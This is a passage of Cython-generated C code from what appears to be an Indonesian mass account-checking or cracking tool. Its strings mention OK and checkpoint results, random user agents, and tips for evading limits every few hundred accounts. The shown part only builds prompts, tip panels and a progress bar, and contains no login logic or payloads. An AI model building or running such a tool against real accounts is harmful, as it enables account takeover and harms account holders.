      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_3 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_5, __pyx_kp_u_Gunakan_random_User_Agent_bold_g) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_kp_u_Gunakan_random_User_Agent_bold_g);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 48, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_v_random_user_agent = __pyx_t_3;
  __pyx_t_3 = 0;

   
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_rich, __pyx_n_s_print); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 49, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_rich, __pyx_n_s_panel); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 49, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_6 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 49, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_style, __pyx_n_u_theme) < 0) __PYX_ERR(0, 49, __pyx_L1_error)
  __pyx_t_11 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_tuple__7, __pyx_t_6); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 49, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_6 = NULL;
  __pyx_t_12 = 0;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_6)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_6);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
      __pyx_t_12 = 1;
    }
  }
  #if CYTHON_FAST_PYCALL
  if (PyFunction_Check(__pyx_t_2)) {
    PyObject *__pyx_temp[4] = {__pyx_t_6, __pyx_kp_u__6, __pyx_t_11, __pyx_kp_u__6};
    __pyx_t_3 = __Pyx_PyFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 49, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
  } else
  #endif
  #if CYTHON_FAST_PYCCALL
  if (__Pyx_PyFastCFunction_Check(__pyx_t_2)) {
    PyObject *__pyx_temp[4] = {__pyx_t_6, __pyx_kp_u__6, __pyx_t_11, __pyx_kp_u__6};
    __pyx_t_3 = __Pyx_PyCFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 49, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
  } else
  #endif
  {
    __pyx_t_5 = PyTuple_New(3+__pyx_t_12); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 49, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    if (__pyx_t_6) {
      __Pyx_GIVEREF(__pyx_t_6); PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_6); __pyx_t_6 = NULL;
    }
    __Pyx_INCREF(__pyx_kp_u__6);
    __Pyx_GIVEREF(__pyx_kp_u__6);
    PyTuple_SET_ITEM(__pyx_t_5, 0+__pyx_t_12, __pyx_kp_u__6);
    __Pyx_GIVEREF(__pyx_t_11);
    PyTuple_SET_ITEM(__pyx_t_5, 1+__pyx_t_12, __pyx_t_11);
    __Pyx_INCREF(__pyx_kp_u__6);
    __Pyx_GIVEREF(__pyx_kp_u__6);
    PyTuple_SET_ITEM(__pyx_t_5, 2+__pyx_t_12, __pyx_kp_u__6);
    __pyx_t_11 = 0;
    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_5, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 49, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  }
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

   
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_rich, __pyx_n_s_confirm); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 50, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_ask); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 50, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_5);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_5, function);
    }
  }
  __pyx_t_3 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_2, __pyx_kp_u_Tampikan_Informasi_akun) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_kp_u_Tampikan_Informasi_akun);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 50, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (unlikely(PyDict_SetItem(__pyx_v_kwargs, __pyx_n_u_show_info, __pyx_t_3) < 0)) __PYX_ERR(0, 50, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

   
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u_Hasil_OK_theme_ok_Hasil_CP_theme, __pyx_n_s_format); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 51, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_5 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 51, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_self, __pyx_n_s_OK_FILES_SAVED); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 51, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_ok, __pyx_t_2) < 0) __PYX_ERR(0, 51, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_self, __pyx_n_s_CP_FILES_SAVED); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 51, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_cp, __pyx_t_2) < 0) __PYX_ERR(0, 51, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_empty_tuple, __pyx_t_5); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 51, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_v_saved = __pyx_t_2;
  __pyx_t_2 = 0;

   
  __pyx_t_2 = PyList_New(3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 52, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_kp_u_Jika_kamu_menggunakan_Wifi_mungk);
  __Pyx_GIVEREF(__pyx_kp_u_Jika_kamu_menggunakan_Wifi_mungk);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_kp_u_Jika_kamu_menggunakan_Wifi_mungk);
  __Pyx_INCREF(__pyx_kp_u_Setiap_theme_200_theme_500_akun);
  __Pyx_GIVEREF(__pyx_kp_u_Setiap_theme_200_theme_500_akun);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_kp_u_Setiap_theme_200_theme_500_akun);
  __Pyx_INCREF(__pyx_kp_u_Jika_proses_stuk_atau_macet_nyal);
  __Pyx_GIVEREF(__pyx_kp_u_Jika_proses_stuk_atau_macet_nyal);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_kp_u_Jika_proses_stuk_atau_macet_nyal);
  __pyx_v_tips = ((PyObject*)__pyx_t_2);
  __pyx_t_2 = 0;

   
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_rich, __pyx_n_s_print); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_rich, __pyx_n_s_panel); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_11 = PyTuple_New(1); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  __Pyx_INCREF(__pyx_v_saved);
  __Pyx_GIVEREF(__pyx_v_saved);
  PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_v_saved);
  __pyx_t_6 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_title, __pyx_kp_u_Hasil_Tersimpan) < 0) __PYX_ERR(0, 57, __pyx_L1_error)
  __pyx_t_9 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_11, __pyx_t_6); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_6 = NULL;
  __pyx_t_12 = 0;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
    __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
    if (likely(__pyx_t_6)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
      __Pyx_INCREF(__pyx_t_6);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_5, function);
      __pyx_t_12 = 1;
    }
  }
  #if CYTHON_FAST_PYCALL
  if (PyFunction_Check(__pyx_t_5)) {
    PyObject *__pyx_temp[3] = {__pyx_t_6, __pyx_kp_u__6, __pyx_t_9};
    __pyx_t_2 = __Pyx_PyFunction_FastCall(__pyx_t_5, __pyx_temp+1-__pyx_t_12, 2+__pyx_t_12); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 57, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
  } else
  #endif
  #if CYTHON_FAST_PYCCALL
  if (__Pyx_PyFastCFunction_Check(__pyx_t_5)) {
    PyObject *__pyx_temp[3] = {__pyx_t_6, __pyx_kp_u__6, __pyx_t_9};
    __pyx_t_2 = __Pyx_PyCFunction_FastCall(__pyx_t_5, __pyx_temp+1-__pyx_t_12, 2+__pyx_t_12); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 57, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
  } else
  #endif
  {
    __pyx_t_11 = PyTuple_New(2+__pyx_t_12); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 57, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_11);
    if (__pyx_t_6) {
      __Pyx_GIVEREF(__pyx_t_6); PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_t_6); __pyx_t_6 = NULL;
    }
    __Pyx_INCREF(__pyx_kp_u__6);
    __Pyx_GIVEREF(__pyx_kp_u__6);
    PyTuple_SET_ITEM(__pyx_t_11, 0+__pyx_t_12, __pyx_kp_u__6);
    __Pyx_GIVEREF(__pyx_t_9);
    PyTuple_SET_ITEM(__pyx_t_11, 1+__pyx_t_12, __pyx_t_9);
    __pyx_t_9 = 0;
    __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_t_11, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 57, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
  }
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

   
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_rich, __pyx_n_s_print); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 58, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_v_rich, __pyx_n_s_panel); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 58, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  __pyx_t_9 = PyUnicode_Join(__pyx_kp_u__5, __pyx_v_tips); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 58, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  __pyx_t_6 = PyTuple_New(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 58, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_GIVEREF(__pyx_t_9);
  PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_t_9);
  __pyx_t_9 = 0;
  __pyx_t_9 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 58, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  if (PyDict_SetItem(__pyx_t_9, __pyx_n_s_title, __pyx_n_u_Tips) < 0) __PYX_ERR(0, 58, __pyx_L1_error)
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_11, __pyx_t_6, __pyx_t_9); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 58, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
  __pyx_t_9 = NULL;
  __pyx_t_12 = 0;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
    __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_5);
    if (likely(__pyx_t_9)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
      __Pyx_INCREF(__pyx_t_9);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_5, function);
      __pyx_t_12 = 1;
    }
  }
  #if CYTHON_FAST_PYCALL
  if (PyFunction_Check(__pyx_t_5)) {
    PyObject *__pyx_temp[3] = {__pyx_t_9, __pyx_t_3, __pyx_kp_u__6};
    __pyx_t_2 = __Pyx_PyFunction_FastCall(__pyx_t_5, __pyx_temp+1-__pyx_t_12, 2+__pyx_t_12); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 58, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  } else
  #endif
  #if CYTHON_FAST_PYCCALL
  if (__Pyx_PyFastCFunction_Check(__pyx_t_5)) {
    PyObject *__pyx_temp[3] = {__pyx_t_9, __pyx_t_3, __pyx_kp_u__6};
    __pyx_t_2 = __Pyx_PyCFunction_FastCall(__pyx_t_5, __pyx_temp+1-__pyx_t_12, 2+__pyx_t_12); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 58, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  } else
  #endif
  {
    __pyx_t_6 = PyTuple_New(2+__pyx_t_12); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 58, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    if (__pyx_t_9) {
      __Pyx_GIVEREF(__pyx_t_9); PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_t_9); __pyx_t_9 = NULL;
    }
    __Pyx_GIVEREF(__pyx_t_3);
    PyTuple_SET_ITEM(__pyx_t_6, 0+__pyx_t_12, __pyx_t_3);
    __Pyx_INCREF(__pyx_kp_u__6);
    __Pyx_GIVEREF(__pyx_kp_u__6);
    PyTuple_SET_ITEM(__pyx_t_6, 1+__pyx_t_12, __pyx_kp_u__6);
    __pyx_t_3 = 0;
    __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_t_6, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 58, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  }
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

   
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_rich, __pyx_n_s_progress); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 60, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_Progress); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 60, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

   
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_rich, __pyx_n_s_progress); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 61, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_SpinnerColumn); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 61, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_9))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_9);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_9, function);
    }
  }
  __pyx_t_5 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_9, __pyx_t_3, __pyx_n_u_clock) : __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_n_u_clock);
  __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 61, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

   
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_rich, __pyx_n_s_progress); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 63, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_BarColumn); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 63, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_11))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_11);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_11, function);
    }
  }
  __pyx_t_9 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_11);
  __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 63, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

   
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_rich, __pyx_n_s_progress); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 65, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_TimeElapsedColumn); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 65, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_1);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_1, function);
    }
  }
  __pyx_t_11 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 65, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = NULL;
  __pyx_t_12 = 0;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
    __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_6);
    if (likely(__pyx_t_1)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
      __Pyx_INCREF(__pyx_t_1);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_6, function);
      __pyx_t_12 = 1;
    }
  }
  #if CYTHON_FAST_PYCALL
  if (PyFunction_Check(__pyx_t_6)) {
    PyObject *__pyx_temp[6] = {__pyx_t_1, __pyx_t_5, __pyx_kp_u_progress_description_task_descr, __pyx_t_9, __pyx_kp_u_progress_percentage_task_percen, __pyx_t_11};
    __pyx_t_2 = __Pyx_PyFunction_FastCall(__pyx_t_6, __pyx_temp+1-__pyx_t_12, 5+__pyx_t_12); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 60, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
    __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
  } else
  #endif
  #if CYTHON_FAST_PYCCALL
  if (__Pyx_PyFastCFunction_Check(__pyx_t_6)) {
    PyObject *__pyx_temp[6] = {__pyx_t_1, __pyx_t_5, __pyx_kp_u_progress_description_task_descr, __pyx_t_9, __pyx_kp_u_progress_percentage_task_percen, __pyx_t_11};
    __pyx_t_2 = __Pyx_PyCFunction_FastCall(__pyx_t_6, __pyx_temp+1-__pyx_t_12, 5+__pyx_t_12); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 60, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
    __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
  } else
  #endif
  {
    __pyx_t_3 = PyTuple_New(5+__pyx_t_12); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 60, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    if (__pyx_t_1) {
      __Pyx_GIVEREF(__pyx_t_1); PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_t_1); __pyx_t_1 = NULL;
    }
    __Pyx_GIVEREF(__pyx_t_5);
    PyTuple_SET_ITEM(__pyx_t_3, 0+__pyx_t_12, __pyx_t_5);
    __Pyx_INCREF(__pyx_kp_u_progress_description_task_descr);
    __Pyx_GIVEREF(__pyx_kp_u_progress_description_task_descr);
    PyTuple_SET_ITEM(__pyx_t_3, 1+__pyx_t_12, __pyx_kp_u_progress_description_task_descr);
    __Pyx_GIVEREF(__pyx_t_9);
    PyTuple_SET_ITEM(__pyx_t_3, 2+__pyx_t_12, __pyx_t_9);
    __Pyx_INCREF(__pyx_kp_u_progress_percentage_task_percen);
    __Pyx_GIVEREF(__pyx_kp_u_progress_percentage_task_percen);
    PyTuple_SET_ITEM(__pyx_t_3, 3+__pyx_t_12, __pyx_kp_u_progress_percentage_task_percen);
    __Pyx_GIVEREF(__pyx_t_11);
    PyTuple_SET_ITEM(__pyx_t_3, 4+__pyx_t_12, __pyx_t_11);
    __pyx_t_5 = 0;
    __pyx_t_9 = 0;
    __pyx_t_11 = 0;
    __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_t_3, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 60, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_v_progress = __pyx_t_2;
  __pyx_t_2 = 0;

   
  __pyx_t_4 = __Pyx_PyObject_IsTrue(__pyx_v_random_user_agent); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 68, __pyx_L1_error)
  if (__pyx_t_4) {

     
    __pyx_t_2 = PyList_New(0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 69, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_self, __pyx_n_s_TARGET); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 69, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_copy); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 69, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_11);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_11))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_11);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_11, function);
      }
    }
    __pyx_t_6 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_11);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
